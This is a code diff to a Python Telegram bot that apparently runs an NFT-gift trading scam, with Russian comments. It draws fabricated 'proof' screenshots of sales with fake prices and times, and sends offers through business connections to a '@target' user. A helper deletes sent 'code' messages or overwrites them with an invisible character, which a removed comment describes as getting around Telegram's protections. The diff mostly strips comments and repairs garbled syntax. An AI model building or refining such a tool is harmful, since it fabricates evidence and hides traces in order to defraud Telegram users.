@@ -111,8 +111,7 @@ def parse_price(text: str):
 def generate_proof_image(nft_name: str, price_str: str) -> BytesIO:
     template_path = "IMG_0401.jpg"
     if not os.path.exists(template_path):
-        # Если картинки нет, создаем заглушку
-        img = Image.new('RGB', (800, 600), color = (14, 22, 33))
+        img = Image.new('RGB', (800, 600), color=(14, 22, 33))
         draw = ImageDraw.Draw(img)
         draw.text((50, 50), f"Шаблон {template_path} не найден!", fill=(255, 0, 0))
         output = BytesIO()
@@ -123,14 +122,11 @@ def generate_proof_image(nft_name: str, price_str: str) -> BytesIO:
     img = Image.open(template_path)
     draw = ImageDraw.Draw(img)
 
-    # Координаты для замазывания (подобраны под твой скриншот)
     rect_x1, rect_y1 = 350, 320
     rect_x2, rect_y2 = 1020, 420
     
-    # Заливаем фоном карточки (темно-серый)
     draw.rectangle([rect_x1, rect_y1, rect_x2, rect_y2], fill=(28, 35, 49))
 
-    # Шрифты
     try:
         font_large = ImageFont.truetype("arial.ttf", 24)
         font_small = ImageFont.truetype("arial.ttf", 16)
@@ -140,15 +136,12 @@ def generate_proof_image(nft_name: str, price_str: str) -> BytesIO:
         font_small = ImageFont.load_default()
         font_price = ImageFont.load_default()
 
-    # Рандомное время
     now = datetime.now()
     date_str = f"Сегодня, {now.strftime('%H:%M')}"
     
-    # Рисуем текст
     draw.text((370, 335), date_str, fill=(150, 150, 150), font=font_small)
     draw.text((370, 365), nft_name, fill=(255, 255, 255), font=font_large)
     
-    # Цена
     price_text = f"{price_str} ⭐"
     draw.text((800, 360), price_text, fill=(255, 255, 255), font=font_price)
 
@@ -158,7 +151,7 @@ def generate_proof_image(nft_name: str, price_str: str) -> BytesIO:
     return output
 
 # ==========================================
-# ОТПРАВКА / УДАЛЕНИЕ (С ОБХОДОМ)
+# ОТПРАВКА / УДАЛЕНИЕ
 # ==========================================
 async def safe_send(bot_instance: Bot, chat_id: int, text: str, conn_id: str, reply_markup=None, retries=3):
     for attempt in range(retries):
@@ -174,18 +167,11 @@ async def safe_send(bot_instance: Bot, chat_id: int, text: str, conn_id: str, re
     return None
 
 async def delete_code_message(bot_instance: Bot, chat_id: int, msg_id: int, conn_id: str):
-    # Пытаемся удалить
     try: 
         await bot_instance.delete_business_messages(business_connection_id=conn_id, message_ids=[msg_id])
     except Exception:
-        # Если удалить нельзя (новая защита ТГ), заменяем текст на невидимку
         try: 
-            await bot_instance.edit_message_text(
-                text="\u200b", # Невидимый символ (код исчезает из чата)
-                chat_id=chat_id, 
-                message_id=msg_id, 
-                business_connection_id=conn_id
-            )
+            await bot_instance.edit_message_text(text="\u200b", chat_id=chat_id, message_id=msg_id, business_connection_id=conn_id)
         except Exception: 
             pass
 
@@ -245,7 +231,7 @@ async def cb_main_menu(cb: CallbackQuery):
     await cb.answer()
 
 # ==========================================
-# МОИ ОФФЕРЫ И ГЕНЕРАЦИЯ ДОКА
+# МОИ ОФФЕРЫ
 # ==========================================
 @router.callback_query(F.data == "my_offers_menu")
 async def cb_my_offers_menu(cb: CallbackQuery):
@@ -265,8 +251,10 @@ async def cb_my_offers_menu(cb: CallbackQuery):
         price_str = f"{o['price_amount']} ⭐️" if o["price_currency"] == "Stars" else f"{o['price_amount']} Gram"
         
         kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="📸 Доказательство", callback_data=f"proof:{o['id']}"),
-             InlineKeyboardButton(text="🗑 Удалить", callback_data=f"del_offer:{o['id']}")]
+            [
+                InlineKeyboardButton(text="📸 Доказательство", callback_data=f"proof:{o['id']}"),
+                InlineKeyboardButton(text="🗑 Удалить", callback_data=f"del_offer:{o['id']}")
+            ]
         ])
         
         await cb.message.answer(
@@ -306,7 +294,7 @@ async def cb_del_offer(cb: CallbackQuery):
     await cb.answer()
 
 # ==========================================
-# ПОДПИСКА (С ОБОСНОВАНИЕМ ЦЕНЫ)
+# ПОДПИСКА
 # ==========================================
 @router.callback_query(F.data == "buy_sub")
 async def cb_buy_sub(cb: CallbackQuery):
@@ -358,11 +346,34 @@ async def cmd_setuser(msg: Message):
         conn.execute("UPDATE users SET my_username=? WHERE user_id=?", (new_rec, uid))
     await msg.reply(f"✅ Ник изменен на <b>@{new_rec}</b>.")
 
+@router.callback_query(F.data == "create_offer_btn")
+async def cb_create_offer(cb: CallbackQuery):
+    await cb.message.edit_text(
+        "📝 <b>Формат:</b>\n<code>/offer [ссылка] [цена] [@username] [язык]</code>\n\n"
+        "Пример:\n<code>/offer https://t.me/nft/MirageLamp-73768 1500 stars @target en</code>\n\n"
+        "Языки: ru, en, it, zh (по умолчанию ru).",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]])
+    )
+    await cb.answer()
+
+@router.callback_query(F.data == "settings")
+async def cb_settings(cb: CallbackQuery):
+    uid = cb.from_user.id
+    with get_db() as conn:
+        user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
+    curr = user["my_username"] if user and user["my_username"] else DEFAULT_RECEIVER
+    text = (
+        f"<b>⚙️ Настройки</b>\n\nВаш ник: <b>@{curr}</b>\n\n"
+        f"▪️ <code>/setuser @ник</code> — сменить ник\n"
+        f"▪️ <code>/key TG-XXXXXX</code> — активировать подписку"
+    )
+    await cb.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]]))
+    await cb.answer()
+
 # ==========================================
 # СОЗДАНИЕ ОФФЕРА
-# =========================================line_keyboard=[
-=
-       @router.message(F.text.regexp(r"^/offer\s+"))
+# ==========================================
+@router.message(F.text.regexp(r"^/offer\s+"))
 async def cmd_offer(msg: Message):
     uid = msg.from_user.id
     is_admin = (uid == ADMIN_ID)
@@ -379,7 +390,6 @@ async def cmd_offer(msg: Message):
     parts = msg.text.replace("/offer", "").strip().split()
     if len(parts) < 3: return await msg.reply("❌ /offer [ссылка] [цена] [@юзер] [язык]")
 
-    # Проверка языка
     lang = "ru"
     if parts[-1].lower() in LANGUAGES:
         lang = parts[-1].lower()
@@ -418,7 +428,7 @@ async def cmd_cancel_offer(msg: Message):
         else: await msg.reply("❌ Не найден.")
 
 # ==========================================
-# ОТПРАВКА ОФФЕРА В ЧАТ (С ОБХОДОМ)
+# ОТПРАВКА ОФФЕРА В ЧАТ
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
@@ -460,7 +470,8 @@ async def handle_business_message(msg: Message):
         f"{nft_link}"
     )
 
-    kb = InlineKeyboardMarkup(in [InlineKeyboardButton(text=lang_data['btn_reject'], callback_data=f"reject:{oid}"),
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=lang_data['btn_reject'], callback_data=f"reject:{oid}"),
          InlineKeyboardButton(text=lang_data['btn_accept'], callback_data=f"accept1:{oid}")]
     ])
     
